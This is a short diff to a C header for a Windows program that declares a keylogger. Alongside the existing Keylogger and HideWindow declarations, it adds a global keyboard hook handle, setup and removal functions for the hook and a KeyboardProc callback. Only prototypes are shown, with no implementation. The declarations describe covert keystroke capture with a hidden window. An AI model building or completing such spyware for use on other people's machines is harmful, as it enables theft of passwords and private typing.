@@ -25,12 +25,17 @@
 #include <libloaderapi.h>
 #include <stdbool.h>
 
+extern HHOOK g_Hook;
 
 /* Window */
 void    HideWindow(void);
 
 /* Key Hook */
-void    SetupKeyHook()
+bool    SetupKeyHook();
+void    RemoveKeyHook();
 bool    Keylogger();
+
+/*Callback*/
+LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 
 #endif
